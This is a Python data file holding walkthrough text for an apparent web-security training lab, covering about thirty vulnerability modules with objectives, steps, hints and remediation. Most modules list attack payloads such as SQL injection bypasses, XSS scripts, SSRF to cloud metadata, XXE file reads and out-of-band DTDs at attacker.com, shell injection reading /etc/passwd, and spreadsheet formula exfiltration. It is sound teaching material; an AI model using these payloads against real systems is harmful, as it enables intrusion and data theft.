# Lab walkthrough content for each module
# objective, steps, hints, solution

LAB_CONTENT = {
    "xss-guestbook": {
        "objective": "Perform a stored XSS attack by posting a malicious script in the guestbook that executes when another user views the page.",
        "steps": [
            "Open the vulnerable guestbook application in the terminal below.",
            "Post a message with a script payload in the Message field (e.g. <script>alert(1)</script>).",
            "Submit the form. The payload is stored in the database unsanitized.",
            "Reload the page. Your script executes because the app renders content with |safe (no escaping).",
            "Try other payloads: <img src=x onerror=alert(1)> or event handlers like onmouseover.",
        ],
        "hints": [
            "The Message field accepts any input. Look at how existing messages are rendered.",
            "The template uses {{ msg.content|safe }} — the |safe filter disables HTML escaping.",
            "Classic payload: <script>alert(document.domain)</script>",
        ],
        "solution": "The app uses Jinja2's |safe filter on user content, so HTML/JS is rendered verbatim. Post <script>alert(1)</script> in the Message field. Remediation: remove |safe and use {{ msg.content }} so output is escaped, or use a proper HTML sanitizer (e.g. DOMPurify) with an allowlist.",
    },
    "sqli-login": {
        "objective": "Bypass the login form using SQL injection to authenticate as any user without knowing the password.",
        "steps": [
            "Open the SQLi login form in the terminal below.",
            "Try the classic bypass: Username = ' OR 1=1 --, Password = anything.",
            "Submit. The query becomes: SELECT ... WHERE username='' OR 1=1 --' AND password='...'.",
            "The -- comments out the rest; OR 1=1 makes the condition true; first row is returned.",
            "Try UNION-based extraction: ' UNION SELECT 1, group_concat(username||':'||password) FROM users --",
        ],
        "hints": [
            "The backend builds the query with f-strings: f\"... WHERE username = '{username}' AND password = '{password}'\".",
            "Single quotes can break out of the string. -- comments out the rest of the line in SQLite.",
            "OR 1=1 is always true, so the WHERE clause matches all rows.",
        ],
        "solution": "Username: ' OR 1=1 -- and Password: x. The query becomes SELECT id, username FROM users WHERE username='' OR 1=1 --' AND password='x', returning the first user. Remediation: use parameterized queries: cur.execute(\"SELECT ... WHERE username=? AND password=?\", (username, password)).",
    },
    "idor-profile": {
        "objective": "Access other users' profile data by manipulating the id parameter, without authentication.",
        "steps": [
            "Open the IDOR Profile Viewer in the terminal below.",
            "The default shows profile id=1. Change the id to 2, 3, 4 and click View.",
            "Observe that you can read any user's username and plaintext password.",
            "No login or ownership check is performed — classic IDOR (Insecure Direct Object Reference).",
        ],
        "hints": [
            "The app fetches user records by id from the query parameter.",
            "There is no check that the requester owns or is authorized to view that profile.",
            "Try id=1, id=2, id=3 — all return different users' data.",
        ],
        "solution": "Change ?id=1 to ?id=2 (or 3, 4) to enumerate all users. The app uses cur.execute(\"SELECT id, username, password FROM users WHERE id = ?\", (target_id,)) with no auth. Remediation: require authentication, verify the user owns the resource, and never return password fields in profile APIs.",
    },
    "ssrf-proxy": {
        "objective": "Exploit the SSRF vulnerability to make the server fetch internal or arbitrary URLs (e.g. cloud metadata, localhost services).",
        "steps": [
            "The proxy form fetches any URL you provide. Enter http://localhost:5000 and click Fetch.",
            "The Go backend fetches the URL and returns the response — no allowlist or validation.",
            "Try http://169.254.169.254/ (AWS metadata) or http://metadata.google.internal/ (GCP) if running in cloud.",
            "Try file:///etc/passwd (if the Go client follows file scheme — may be blocked).",
        ],
        "hints": [
            "The url parameter is passed directly to the Go service with no validation.",
            "Cloud VMs often expose metadata at 169.254.169.254.",
            "Internal services like http://localhost:6379 (Redis) or :9200 (Elasticsearch) can be probed.",
        ],
        "solution": "Enter http://localhost:5000 to fetch the app itself, or http://169.254.169.254/latest/meta-data/ for AWS metadata. Remediation: validate and allowlist URLs, block private IP ranges, disable file:// and dangerous schemes.",
    },
    "csrf-no-token": {
        "objective": "Understand CSRF: a malicious site can trigger state-changing requests on behalf of a logged-in victim. This module demonstrates the missing CSRF token.",
        "steps": [
            "Read the objective and understand Cross-Site Request Forgery.",
            "The guestbook and login forms have no CSRF token — they could be submitted from another origin.",
            "A page on evil.com could embed a form that POSTs to this app when the victim visits.",
            "Review the solution to see how SameSite cookies and anti-CSRF tokens mitigate this.",
        ],
        "hints": [
            "CSRF exploits the browser's automatic inclusion of cookies in cross-origin requests.",
            "SameSite=Strict or Lax limits when cookies are sent.",
            "Anti-CSRF tokens must be unique per session and validated server-side.",
        ],
        "solution": "Forms lack CSRF tokens. An attacker hosts a page that auto-submits a form to /modules/xss-guestbook with malicious content. Mitigations: SameSite cookie attribute, anti-CSRF tokens (e.g. Flask-WTF), or custom tokens validated server-side.",
    },
    "upload-no-validation": {
        "objective": "Learn about file upload risks: unrestricted uploads can lead to malware hosting, path traversal, or RCE if executables are stored in webroot.",
        "steps": [
            "This module is a reference for file upload vulnerabilities.",
            "Without validation, an app might accept .php, .jsp, or allow path traversal (../../../etc/passwd).",
            "Exploitation depends on: allowed extensions, MIME checks, storage path, and execution context.",
            "Common bypasses: double extension, null bytes, Content-Type manipulation.",
        ],
        "hints": [
            "Check what file types and names are accepted.",
            "Path traversal: filename=../../../var/www/html/shell.php",
            "If the server executes uploaded files, a web shell can achieve RCE.",
        ],
        "solution": "Implement: extension allowlist, MIME validation, content scanning, path canonicalization, store outside webroot or with non-executable permissions, use UUIDs for filenames.",
    },
    "web-cache": {
        "objective": "Understand Web Cache Deception vs Poisoning. Deception: trick victim into visiting a cacheable URL that serves their sensitive data. Poisoning: inject malicious response via unkeyed input.",
        "steps": ["Study cache key vs unkeyed headers.", "Use Param Miner to find unkeyed inputs.", "Test for XSS/redirect in cached responses.", "Verify poison by requesting without the header."],
        "hints": ["Cache keys usually include: method, URL path, some headers.", "Unkeyed inputs (e.g. X-Forwarded-Host) can alter the response.", "Send payload multiple times until cached."],
        "solution": "Deception: /account/ as /account/logo.png may get cached. Poisoning: inject via unkeyed header, cache the response, victim gets poisoned content. Use web cache testing tools.",
    },
    "session-management": {
        "objective": "Understand session fixation: attacker sets victim's session ID; after login, app reuses it instead of issuing a new one.",
        "steps": ["Attacker gets a session token (e.g. from login page).", "Inject it into victim's browser (XSS, subdomain, etc.).", "Victim logs in; app uses existing token.", "Attacker uses same token to access victim's account."],
        "hints": ["Fixation requires: attacker can set session ID, app doesn't regenerate on auth.", "Mitigation: regenerate session ID on privilege change."],
        "solution": "Never trust client-provided session IDs for new sessions. Regenerate on login. Use HttpOnly, Secure, SameSite on cookies.",
    },
    "open-redirect": {
        "objective": "Exploit open redirects: redirect parameter sends users to attacker-controlled URLs. Chain with OAuth, SSRF, or phishing.",
        "steps": ["Find parameters like redirect=, url=, next=, return=", "Test with full URL: ?redirect=https://evil.com", "Try protocol-relative: //evil.com", "Bypass filters: double encoding, @, #"],
        "hints": ["Many apps validate redirect starts with / or same origin but miss edge cases.", "javascript: or data: schemes can execute code."],
        "solution": "Allowlist redirect targets. Reject absolute URLs. Use relative paths only. Validate final URL server-side.",
    },
    "ssti": {
        "objective": "Server-Side Template Injection: inject template syntax (e.g. {{7*7}}) into user input that gets rendered by the engine.",
        "steps": ["Identify reflected/stored inputs that might reach templates.", "Try polyglot: ${{<%[%'\"}}%\\ or {{7*7}}, ${7*7}, <%= 7*7 %>", "Identify engine from error messages.", "Use engine-specific RCE payloads."],
        "hints": ["Arithmetic works: {{7*7}} returns 49 in Jinja2.", "Explore: {{config}}, {{self.__class__}} in Python.", "Jinja2 RCE: {{''.__class__.__mro__[1].__subclasses__()}}"],
        "solution": "Never embed user input in templates. Use separate context/variables. Sandbox template execution. Prefer logic-less templates.",
    },
    "xxe": {
        "objective": "XXE: inject external entities to read files, perform SSRF, or DoS. Often in XML parsers (SOAP, file upload of SVG/Office).",
        "steps": ["Find XML input (POST body, file upload, SOAP).", "Add ENTITY with file:// or http://", "Use parameter entities for out-of-band.", "Try PHP filter chains for RCE."],
        "hints": ["<!ENTITY xxe SYSTEM \"file:///etc/passwd\">", "Parameter entities: <!ENTITY % xxe SYSTEM \"http://attacker.com/oob.dtd\">"],
        "solution": "Disable external entities: libxml2's LIBXML_NOENT, defusedxml in Python. Use whitelist for DOCTYPE. Prefer JSON/other formats.",
    },
    "jwt-auth": {
        "objective": "Exploit JWT weaknesses: alg:none, weak secrets, JKU/jwk injection, key confusion (RS256 vs HS256).",
        "steps": ["Decode JWT (base64url). Try alg:none, alg:HS256 with weak secret.", "If RS256: replace with HS256, sign with public key.", "JKU: point jku to attacker server with malicious JWK.", "Check expiration, issuer, audience."],
        "hints": ["jwt.io for decode. Hashcat for cracking weak HS256 secrets.", "Key confusion: server expects RS256, attacker sends HS256 signed with pub key."],
        "solution": "Validate alg; reject none. Use strong secrets for HS256. For RS256, verify signature with pub key. Never trust jku/from client.",
    },
    "encoding-crypto": {
        "objective": "Encoding vs encryption vs hashing. Base64 is not encryption. Weak password hashing (MD5, unsalted) enables cracking.",
        "steps": ["Decode Base64/Base64URL — reversible.", "Identify weak hashes: MD5, SHA1, unsalted.", "Use hashcat/john for dictionary/bruteforce.", "Understand salting and proper bcrypt/argon2."],
        "hints": ["Base64 decodes to original bytes. Never store passwords in Base64.", "Rainbow tables defeat unsalted hashes."],
        "solution": "Use bcrypt/argon2/scrypt for passwords. Salt must be unique per user. Base64 for transport encoding only, never for secrets.",
    },
    "request-smuggling": {
        "objective": "HTTP Request Smuggling: desync front-end and back-end by exploiting Transfer-Encoding vs Content-Length mismatch.",
        "steps": ["Identify TE/CL behavior. TE.TE: frontend rejects, backend accepts.", "CL.0: frontend ignores CL, backend respects.", "Smuggle a request that gets prefixed to next user request.", "Use to bypass auth, access internal endpoints."],
        "hints": ["Burp Suite HTTP Request Smuggler extension.", "Chunk size 0 with suffix can cause different parsing.", "CRLF in headers can split requests."],
        "solution": "Normalize TE/CL at reverse proxy. Disable request smuggling in config. Use HTTP/2 to avoid these issues.",
    },
    "deserialization": {
        "objective": "Insecure deserialization: attacker-controlled data gets deserialized, invoking magic methods (__reduce__, __wakeup__) leading to RCE.",
        "steps": ["Find serialized objects (PHP, Java, Python pickle).", "Modify attributes or inject malicious class.", "Python: __reduce__ returns (os.system, ['id']).", "PHP: __wakeup, __destruct. Java: ObjectInputStream."],
        "hints": ["Pickle in Python is dangerous if untrusted input.", "YAML.load() in Ruby/Python can instantiate arbitrary classes."],
        "solution": "Never deserialize untrusted data. Use JSON. If needed, signing/encryption + allowlist of classes.",
    },
    "command-injection": {
        "objective": "Command injection: user input concatenated into shell command. Use ; | & $() to break out and execute arbitrary commands.",
        "steps": ["Find inputs passed to exec, system, popen, shell_exec.", "Test: ; id, | id, & id, $(id), `id`.", "Blind: sleep 10, curl attacker.com.", "Encoding bypass: $IFS, hex, base64."],
        "hints": ["Ping example: ping -c 1 $ip — inject ; cat /etc/passwd", "Time-based: ; sleep 5 — if delayed, injectable."],
        "solution": "Avoid shell. Use APIs (subprocess with list, no shell=True). Input validation allowlist. Never pass user input to shell.",
    },
    "api-security": {
        "objective": "API risks: mass assignment (add isAdmin via JSON), GraphQL batching (rate limit bypass), type juggling (0e123 == 0e456).",
        "steps": ["Mass assign: POST {username, isAdmin:true}.", "GraphQL: batch 100 queries in one request.", "Type juggling: 0==\"php\" (loose comparison).", "IDOR via object IDs in API."],
        "hints": ["Blacklist isAdmin often misses role, admin, _admin.", "GraphQL introspection reveals schema."],
        "solution": "Whitelist allowed fields. Rate limit per query cost. Strict type comparison. AuthZ on every resource.",
    },
    "information-disclosure": {
        "objective": "Find sensitive data: debug endpoints, stack traces, source maps, .git, backup files, verbose errors.",
        "steps": ["Directory bust: /.git, /backup, /.env, /debug.", "Check error responses for stack traces.", "Source maps reveal original source.", "Comments in HTML/JS may contain secrets."],
        "hints": ["Robots.txt, sitemap.xml often list hidden paths.", "500 errors sometimes leak framework versions."],
        "solution": "Disable debug in prod. Custom error pages. Don't expose .git, backups. Minimize error details.",
    },
    "sensitive-data-url": {
        "objective": "URLs leak via logs, Referer, history, sharing. Never put secrets (tokens, passwords) in query strings.",
        "steps": ["Identify params like ?token=, ?key=, ?password=.", "Referer header leaks full URL to external sites.", "Browser history and logs retain URLs.", "Shareable links expose secrets."],
        "hints": ["Use POST body or Authorization header for tokens.", "Referer-Policy: no-referrer for sensitive pages."],
        "solution": "Secrets in headers or POST body. Short-lived tokens. Referer-Policy. Sanitize logs.",
    },
    "captcha": {
        "objective": "CAPTCHA weaknesses: replay (same answer), validation bypass, leaked answers, low entropy (few possible values).",
        "steps": ["Reuse same CAPTCHA answer for multiple requests.", "Check if CAPTCHA validated server-side.", "Inspect source for answer in HTML/JS.", "Brute-force if small keyspace (e.g. 4 digits)."],
        "hints": ["Some CAPTCHAs store answer in cookie — replay cookie.", "Math CAPTCHAs: 2+3=5 — easily automated."],
        "solution": "One-time use, server-side validation. Don't expose answer client-side. reCAPTCHA v3 for advanced bots.",
    },
    "formula-injection": {
        "objective": "CSV/Excel formula injection: =cmd|'/c calc'!A1 or =HYPERLINK() can execute when user opens exported file.",
        "steps": ["Export user input to CSV/Excel.", "Inject =1+1 or =cmd|... for Excel.", "DDE in Word: { DDEAUTO c:\\\\...\\\\calc }", "Exfiltrate via =WEBSERVICE(url)."],
        "hints": ["Prefix with ' to escape: ',=1+1 shows as text.", "Sanitize =, +, -, @ at cell start."],
        "solution": "Escape/prefix formulas. CSV: leading tab or quote. Excel: sanitize leading =+@-. Use safe export libs.",
    },
    "crlf-injection": {
        "objective": "CRLF injection: inject \\r\\n in headers or body to split response, add Set-Cookie, or poison cache.",
        "steps": ["Find reflected input in headers (e.g. redirect Location).", "Inject %0d%0aSet-Cookie: session=evil.", "Response splitting: %0d%0a%0d%0a<script>...", "Session fixation via injected cookie."],
        "hints": ["Unencoded CRLF in Location: url%0d%0aSet-Cookie.", "Some servers normalize but others don't."],
        "solution": "Validate header values. Reject CRLF. Use safe redirect APIs. Don't reflect user input in headers.",
    },
    "scoping": {
        "objective": "Key scoping questions for a web app pentest: in-scope URLs, auth requirements, rate limits, exclusions.",
        "steps": ["Define scope: which domains, subdomains, API versions?", "Auth: test credentials, guest access?", "Rules of engagement: destructive tests, timing.", "Out of scope: prod payment, third-party."],
        "hints": ["Always get written approval.", "Clarify WAF/testing limits."],
        "solution": "Document scope, RoE, contacts. Use scope management in Burp. Re-scope if scope creep.",
    },
    "general-web-security": {
        "objective": "Overview: OWASP Top 10, WAF bypass, input validation, defense in depth. Tie concepts to specific vulns.",
        "steps": ["Review OWASP Top 10 mapping to modules.", "WAF bypass: encoding, case, fragmentation.", "Input validation: server-side, allowlist.", "Defense: CSP, secure cookies, HTTPS."],
        "hints": ["Each Top 10 item maps to one or more labs.", "Layered controls reduce blast radius."],
        "solution": "Follow secure SDLC. Threat model. Test continuously. Patch dependencies.",
    },
    "behavioral": {
        "objective": "Prepare for behavioral questions: why AppSec, handling stress, strengths/weaknesses, conflict resolution.",
        "steps": ["Reflect on your AppSec journey and motivations.", "Prepare STAR stories (Situation, Task, Action, Result).", "Relate technical work to business impact.", "Practice concise, confident answers."],
        "hints": ["Common themes: motivations, conflict, strengths/weaknesses.", "Be specific, not generic."],
        "solution": "No single answer. Tailor stories to the role. Show curiosity and continuous learning.",
    },
    "hpp-waf": {
        "objective": "HTTP Parameter Pollution: duplicate params may be parsed differently by app vs WAF. Use to bypass filters.",
        "steps": ["Send two params: id=1&id=2. Observe which value the app uses.", "WAF might check first, app uses last.", "Inject payload in one, benign in other.", "Test with different param orders."],
        "hints": ["PHP often uses last; ASP uses first.", "Use for SQLi/WAF bypass: id=1&id=1' OR 1=1--"],
        "solution": "Normalize params server-side. WAF and app must parse consistently. Reject duplicate params if ambiguous.",
    },
    "same-origin-cors": {
        "objective": "Understand SOP and CORS: cross-origin requests blocked unless CORS allows. Misconfigurations (Access-Control-Allow-Origin: *) leak data.",
        "steps": ["Try fetching API from different origin in browser.", "Check Access-Control-Allow-Origin and Credentials.", "Reflect origin without validation allows any site to read response.", "Preflight OPTIONS reveals allowed methods."],
        "hints": ["Credentials + * is invalid. Use explicit origin.", "Null origin can be abused in some contexts."],
        "solution": "Whitelist origins. Don't reflect arbitrary Origin. Validate preflight. Use same-site when possible.",
    },
    "websockets": {
        "objective": "WebSocket security: no CORS, custom auth. Replay, injection, or hijack if handshake/auth is weak.",
        "steps": ["Intercept WebSocket handshake and messages.", "Check Sec-WebSocket-Key, auth in first message.", "Replay messages. Inject into JSON.", "Cross-site WebSocket hijacking if no origin check."],
        "hints": ["Origin header can be spoofed in some clients.", "Token in URL leaks via Referer."],
        "solution": "Validate Origin. Authenticate after connection. Use wss://. Don't put secrets in URL.",
    },
    "csp": {
        "objective": "Content Security Policy: misconfigurations like unsafe-inline, unsafe-eval allow XSS. Nonces/hashes tighten script-src.",
        "steps": ["Check CSP header: Content-Security-Policy.", "unsafe-inline defeats script-src protection.", "Report-URI for violation reports.", "Test bypasses: JSONP, angular sandbox escape."],
        "hints": ["script-src 'self' unsafe-inline = inline scripts allowed.", "Nonces must be random per request."],
        "solution": "Avoid unsafe-inline. Use nonces or hashes. default-src 'none'; add specific directives. Test CSP.",
    },
    "business-logic": {
        "objective": "Business logic flaws: race conditions, limit overrun, price manipulation, state machine bypass.",
        "steps": ["Identify operations with limits (coupons, transfers).", "Send concurrent requests to race.", "Modify prices in request (decimal, negative).", "Skip steps (e.g. payment) by calling endpoints out of order."],
        "hints": ["Burp Turbo Intruder for race conditions.", "Check if quantity/price validated server-side."],
        "solution": "Validate server-side. Use transactions. Atomic operations. Rate limit. State machine enforcement.",
    },
    "prototype-pollution": {
        "objective": "Prototype pollution: __proto__ or constructor.prototype pollution affects all objects. Can lead to RCE, XSS, auth bypass.",
        "steps": ["Find JSON merge or object assign with user input.", "Inject {\"__proto__\":{\"isAdmin\":true}}.", "Check for gadget (code path using polluted property).", "Client-side: DOM XSS via polluted attributes."],
        "hints": ["Node merge, lodash defaultsDeep vulnerable.", "Object.freeze(Object.prototype) mitigates."],
        "solution": "Use Map. Avoid merging user objects. Sanitize keys. Use --no-proto in JSON.parse.",
    },
    "network-tls": {
        "objective": "TLS/SSL misconfigurations: weak ciphers, deprecated protocols, certificate issues, downgrade attacks.",
        "steps": ["Scan with testssl.sh or nmap --script ssl-enum-ciphers.", "Check TLS 1.0/1.1, SSLv3 disabled.", "Certificate chain, hostname validation.", "HSTS, mixed content."],
        "hints": ["RC4, 3DES, export ciphers are weak.", "BEAST, POODLE require legacy protocol."],
        "solution": "TLS 1.2+. Strong cipher suite. Valid certs. HSTS. Regular scans.",
    },
    "html-injection": {
        "objective": "Beyond XSS: inject HTML for phishing, DoS (large markup), dangling markup to steal tokens.",
        "steps": ["Inject <img>, <a> for phishing links.", "Dangling: <script>var x=' to capture subsequent content.", "PDF generators may interpret HTML/JS.", "Large nested tags for DoS."],
        "hints": ["Attribute injection: \" onclick=\"alert(1).", "Dangling markup exfiltrates via img src."],
        "solution": "Escape all output. CSP. Sanitize if HTML needed. Limit payload size.",
    },
}

def get_lab_content(slug: str) -> dict:
    """Return lab content for a module. Provides defaults for modules without full content."""
    content = LAB_CONTENT.get(slug, {})
    return {
        "objective": content.get("objective", "Study this vulnerability type and practice the exploit."),
        "steps": content.get("steps", ["Review the objective above.", "Follow the steps in the terminal below."]),
        "hints": content.get("hints", ["Try the hints above.", "Experiment in the terminal below."]),
        "solution": content.get("solution", "See the solution above for remediation guidance."),
    }
